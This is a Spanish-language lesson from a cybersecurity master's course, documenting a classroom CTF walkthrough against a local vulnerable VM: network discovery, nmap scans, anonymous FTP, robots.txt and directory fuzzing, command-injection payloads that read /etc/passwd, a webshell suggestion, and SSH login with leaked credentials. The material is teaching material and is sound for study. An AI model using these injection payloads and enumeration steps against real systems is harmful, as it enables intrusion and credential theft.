---
tags:
- Auditoría web
---

# Auditoria Web Desde 0

**EVOLVE ACADEMY - MASTER EN CIBERSEGURIDAD**

**Auditoría Web desde Cero: Metodología Completa**

Instructor: Carlos Castillo · Máquina CTF personalizada

*Temas: Reconocimiento de red · Net-Discover · Nmap · FTP anónimo · robots.txt · DirSearch · Command Injection · SSH · Rabbit Holes*

# **① La máquina y el entorno**

La máquina vulnerable se importa directamente desde un fichero .ova en VirtualBox. Atacante (Kali Linux) y víctima comparten la misma red NAT para tener visibilidad mutua. La IP de la víctima no se conoce de antemano: se descubre durante el reconocimiento.

| **💡 INFO**  Formato de práctica: un alumno (John) actúa como atacante tomando decisiones en tiempo real. El resto de la clase observa y participa. Esta metodología simula la dinámica real de una auditoría. |
| --- |

# **② Fase 1 — Reconocimiento de red**

El punto de partida: estamos en la misma red que la víctima y no sabemos nada más. Dos herramientas para descubrir hosts activos:

| **Herramienta** | **Protocolo** | **Cuándo usarla** |
| --- | --- | --- |
| Net-Discover | ARP (capa 2) | Reconocimiento inicial en red local. Más sigiloso, sin TCP. |
| Nmap (host discovery) | TCP/ICMP (capas 3-4) | Más ruido. Cuando Net-Discover no es suficiente o hay VLANs. |

| # Descubrimiento ARP con Net-Discover: |
| --- |
| sudo netdiscover -r 10.0.2.0/24 |
|  |
| # Nmap también puede hacer host discovery (más ruidoso): |
| nmap -sn 10.0.2.0/24 |

| **💡 INFO**  AWS no acepta ARP, por lo que Net-Discover no funciona en entornos cloud. En esos entornos se usa Nmap con -sn o se confía en el inventario del cliente. |
| --- |

# **③ Fase 2 — Escaneo de puertos y servicios**

El escaneo se realiza en dos fases para equilibrar velocidad y cobertura:

| **Escaneo rápido (-sC -sV)** | → | **Analizar resultados** | → | **Escaneo completo (-p-) si hace falta** | → | **Investigar en HackTricks** |
| --- | --- | --- | --- | --- | --- | --- |

| # Fase 1 — puertos comunes (rápido, primeros resultados): |
| --- |
| nmap -sC -sV 10.0.2.15 |
|  |
| # -sC lanza scripts por defecto (banner grabbing, configs débiles...) |
| # -sV detecta versiones de los servicios |
|  |
| # Resultado: puertos 21 (FTP), 22 (SSH), 80 (HTTP), 9090 (HTTP) |
|  |
| # Fase 2 — todos los puertos (si los comunes no dan vector): |
| nmap -sC -sV -p- 10.0.2.15 |
|  |
| # Reveló puertos adicionales: 22222 (SSH real) y 60000 (reverse shell parcial) |

| **💡 INFO**  Metodología ante servicios con login (FTP, SSH): tres vectores posibles: (1) fuerza bruta, (2) versión con CVE explotable, (3) mala configuración. Explorar en ese orden. |
| --- |

# **④ Puerto 21 — FTP anónimo**

Nmap indica 'Anonymous FTP login allowed'. Es una mala configuración clásica: el servidor acepta conexiones bajo la cuenta de servicio FTP sin credenciales reales.

| Nmap → FTP anónimo | → | **ftp -a IP** | → | **ls / cd / get** | → | **cat flag.txt (desde Kali)** |
| --- | --- | --- | --- | --- | --- | --- |

| # Conectar con login anónimo automático: |
| --- |
| ftp -a 10.0.2.15 |
|  |
| # Una vez dentro (shell restringida del FTP): |
| help # ver comandos disponibles (no hay cat, locate...) |
| ls # listar ficheros |
| cd pub # cambiar al directorio pub |
| ls # → flag.txt |
| get flag.txt # descargar el fichero |
| exit # salir del FTP |
|  |
| # Leer desde la shell de Kali: |
| cat flag.txt |

| **Comando FTP** | **Función** |
| --- | --- |
| ls / dir | Listar ficheros y directorios del servidor |
| cd <directorio> | Cambiar directorio |
| get <fichero> | Descargar un fichero |
| put <fichero> | Subir un fichero (si hay permisos de escritura) |
| mget \* | Descargar todos los ficheros del directorio actual |
| help / ? | Mostrar comandos disponibles en la shell FTP |

| **💡 INFO**  La cuenta de servicio FTP no es un usuario del sistema: solo puede interactuar con el servicio FTP. Aplica a todos los servicios: Apache, PostgreSQL... cada uno tiene su cuenta de servicio con sus propios permisos. |
| --- |

| **🔐 HACKING**  Si se tiene acceso FTP con permisos de escritura a la carpeta de la web, subir un fichero PHP malicioso (webshell) es el siguiente paso hacia RCE. |
| --- |

# **⑤ Puerto 80 — Auditoría web: metodología completa**

Un servicio HTTP se audita de forma diferente a un servicio de red. No se buscan versiones vulnerables: se enumera la funcionalidad de la aplicación y se buscan fallos en esa funcionalidad.

| **Ver código fuente** | → | **robots.txt** | → | **DirSearch (enumerar dirs)** | → | **Analizar funcionalidades** | → | **Explotar** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

## **Paso 1 — Código fuente del front**

Click derecho → Ver código fuente de la página. El código que se ve es solo el front (HTML, CSS, JavaScript). No es el código del servidor. Puede contener comentarios con rutas sensibles, referencias a APIs o endpoints desconocidos.

## **Paso 2 — robots.txt**

| # Navegar directamente al fichero robots.txt: |
| --- |
| http://10.0.2.15/robots.txt |
|  |
| # También probarlo en subdirectorios: |
| http://10.0.2.15/twiki/robots.txt |
|  |
| # Resultado en esta máquina: |
| # → Revela el directorio /passwords/ |
| # → Dentro: flag.txt y passwords.html |

| **💡 INFO**  robots.txt dice a los buscadores qué NO indexar. Para un pentester eso significa exactamente los directorios más interesantes: los que el propietario quiere que nadie vea. Siempre es el segundo paso en cualquier auditoría web. |
| --- |

## **Paso 3 — Enumeración de directorios (DirSearch / ffuf / Feroxbuster)**

Independientemente de robots.txt, siempre lanzar un enumerador de directorios. Todas las herramientas hacen lo mismo; lo que diferencia los resultados es el diccionario.

| # DirSearch (diccionario propio por defecto): |
| --- |
| dirsearch -u http://10.0.2.15 |
|  |
| # ffuf con diccionario medio (más cobertura): |
| ffuf -u http://10.0.2.15/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt |
|  |
| # Feroxbuster: |
| feroxbuster -u http://10.0.2.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt |

| **Herramienta** | **Característica principal** |
| --- | --- |
| DirSearch | Diccionario propio incluido. Buena opción por defecto. |
| ffuf | Muy rápido, muy flexible. Soporta fuzzing de subdominios (FUZZ al inicio de la URL). |
| Feroxbuster | Recursivo por defecto. Encuentra directorios anidados. |
| GoBuster | Rápido, múltiples modos (dir, dns, vhost). |
| DirBuster | Versión gráfica (Java). Más lenta. |

# **⑥ Command Injection — Explotación de funcionalidad web**

En el directorio cgi-bin hay una página que implementa un traceroute: el usuario introduce una IP y el servidor ejecuta el comando y muestra el resultado. Si el desarrollador no valida el input, el atacante puede inyectar comandos adicionales.

| # La aplicación ejecuta algo así internamente: |
| --- |
| # traceroute <INPUT\_USUARIO> |
|  |
| # Si no valida el input, el operador ; encadena comandos en bash: |
| # INPUT: 10.0.2.15; whoami |
| # → El servidor ejecuta: traceroute 10.0.2.15; whoami |
| # → Responde con el resultado del traceroute Y el resultado de whoami |
|  |
| # Confirmado el Command Injection, enumerar el sistema: |
| 10.0.2.15; head -200 /etc/passwd # usuarios del sistema |
| 10.0.2.15; tree /var/www/www # árbol de directorios de la web |
| 10.0.2.15; id # permisos del proceso web |
| 10.0.2.15; ls /home # usuarios con carpeta home |

| **Operador** | **Comportamiento en bash** | **Uso en Command Injection** |
| --- | --- | --- |
| ; | Ejecuta siempre ambos comandos | El más común. Funciona aunque el primer comando falle. |
| && | Ejecuta el segundo solo si el primero tiene éxito | Útil cuando el primer comando debe completarse. |
| || | Ejecuta el segundo solo si el primero falla | Útil para bypass de validaciones. |
| | | Pipe: stdout del primero → stdin del segundo | Para filtrar o procesar la salida. |

| **🔐 HACKING**  Con Command Injection confirmado y /etc/passwd leído, se obtienen los usuarios reales del sistema (los que tienen /bin/bash). Esto reduce la fuerza bruta de infinito a 4 usuarios concretos. |
| --- |

| **💡 INFO**  La solución al Command Injection es la misma que para SQL Injection: validación estricta del input. Si esperas una IP, valida que el campo contenga exactamente 4 grupos numéricos separados por puntos y rechaza cualquier otro carácter. |
| --- |

# **⑦ Análisis de /etc/passwd — Identificar usuarios del sistema**

| # Formato de /etc/passwd: |
| --- |
| # usuario:x:UID:GID:descripcion:/home/usuario:/bin/shell |
|  |
| # Usuarios con shell real (interesantes para atacar): |
| # root:x:0:0:root:/root:/bin/bash |
| # Summer:x:1001:1001::/home/Summer:/bin/bash |
|  |
| # Cuentas de servicio (sin shell, no sirven para login): |
| # www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin |
| # ftp:x:109:65534::/home/ftp:/usr/sbin/nologin |
|  |
| # Filtrar solo los usuarios con bash: |
| grep '/bin/bash' /etc/passwd # o desde Command Injection: |
| 10.0.2.15; grep '/bin/bash' /etc/passwd |

| **💡 INFO**  En esta máquina /etc/passwd revela los usuarios: root, Rick, Morty y Summer. Esta información se usará después para construir ataques de fuerza bruta dirigidos, en lugar de usar listas genéricas de millones de entradas. |
| --- |

# **⑧ Puerto 9090 — Rabbit Hole (Cockpit)**

El puerto 9090 aloja Cockpit, un panel de administración web para servidores Linux. Presenta un campo de nombre de usuario sin contraseña visible. Cockpit v161 con Fedora 26 tiene CVEs asociados, pero ninguno explotable sin autenticación previa.

| **⚠ AVISO**  Un rabbit hole es un camino que parece prometedor pero no conduce a ningún vector de explotación. Saber cuándo cortar y no seguir invirtiendo tiempo en algo sin salida es una habilidad tan importante como saber explotar. |
| --- |

| **💡 INFO**  Señales de rabbit hole: CVEs que requieren autenticación previa que no tenemos, funcionalidades que no aceptan ningún input manipulable, o enumeración de directorios que devuelve 403 en todo. → Documentar y pasar al siguiente servicio. |
| --- |

# **⑨ Escaneo completo — Puertos no estándar**

Al agotar los puertos comunes sin vector completo, se lanza el escaneo a todos los puertos:

| nmap -sC -sV -p- 10.0.2.15 |
| --- |
|  |
| # Puertos adicionales descubiertos: |
| # 22222/tcp → SSH (el puerto 22 estándar estaba filtrado) |
| # 60000/tcp → TCP con una reverse shell parcial |

| # Probar el puerto 60000 con NetCat: |
| --- |
| nc 10.0.2.15 60000 |
| # Respuesta: 'Welcome to Rick's half-baked reverse shell' |
|  |
| # Shell funcional pero restringida al directorio actual |
| # → Leer la flag disponible y descartar como vector de escalada |

| **⚠ AVISO**  El servicio SSH puede estar en un puerto no estándar (como 22222) para dificultar el descubrimiento. Siempre escanear todos los puertos (-p-) antes de cerrar la enumeración. |
| --- |

# **⑩ Acceso al servidor — SSH con credenciales filtradas**

Con los usuarios extraídos de /etc/passwd y la contraseña encontrada en passwords.html (obtenida por robots.txt), se construye el acceso inicial:

| robots.txt → /passwords/ | → | passwords.html → contraseña 'winter' | → | **ssh Summer@IP -p 22222** | → | **Acceso obtenido** |
| --- | --- | --- | --- | --- | --- | --- |

| # Conectarse al SSH no estándar (puerto 22222): |
| --- |
| ssh Summer@10.0.2.15 -p 22222 |
|  |
| # Contraseña: winter (obtenida de passwords.html) |
|  |
| # Verificar acceso: |
| whoami # → Summer |
| id # → uid, grupos |
| pwd # → /home/Summer |

| **✓ OBJETIVO**  Acceso inicial obtenido: shell como Summer. La próxima fase es la escalada de privilegios hasta root. Comenzar con: sudo -l (permisos sudo), find / -perm -4000 (SUID), y enumerar el sistema con herramientas como LinPEAS. |
| --- |

# **⑪ Resumen: vectores y hallazgos de la sesión**

| **Puerto** | **Servicio** | **Vector** | **Hallazgo** |
| --- | --- | --- | --- |
| 21 | FTP | Login anónimo (anonymous) | flag.txt en /pub/ |
| 80 | HTTP | robots.txt → directorio /passwords/ | flag.txt + passwords.html (credenciales) |
| 80 / cgi-bin | HTTP | Command Injection (;whoami) | Usuarios del sistema desde /etc/passwd |
| 9090 | Cockpit | Rabbit hole — sin vector sin auth | Descartado |
| 22222 | SSH | Credenciales: Summer / winter | Shell en el servidor |
| 60000 | TCP | Reverse shell parcial (nc) | flag.txt (shell restringida) |

| **🔐 HACKING**  El acceso completo a la máquina se consiguió sin ningún exploit sofisticado: enumeración metódica (Nmap), curiosidad ante cada funcionalidad (robots.txt, código fuente) y combinar información de varias fuentes (usuarios de /etc/passwd + contraseña de la web). |
| --- |

# **⑫ Metodología integrada de auditoría web**

| **Fase** | **Acciones** |
| --- | --- |
| 1. Reconocimiento de red | Net-Discover (ARP) → identificar hosts activos |
| 2. Enumeración de puertos | nmap -sC -sV → luego -p- si hace falta |
| 3. Análisis por servicio | FTP: anon / versión / CVE. HTTP: código fuente + robots.txt + dirsearch |
| 4. Explotación de funcionalidades | Buscar inputs que lleguen al servidor (formularios, parámetros de URL) |
| 5. Información extraída | Guardar TODO: usuarios, contraseñas, hashes, rutas, versiones |
| 6. Correlacionar hallazgos | Credenciales de un servicio usadas en otro (pivoting de info) |
| 7. Descartar rabbit holes | Sin autenticación no se puede explotar CVE que la requiere → siguiente |

| **💡 INFO**  Todas las herramientas de fuzzing de directorios (DirSearch, ffuf, Feroxbuster, GoBuster, DirBuster) hacen exactamente lo mismo: probar rutas de un diccionario. La diferencia es el diccionario por defecto y la velocidad. Con el mismo diccionario los resultados son idénticos. |
| --- |
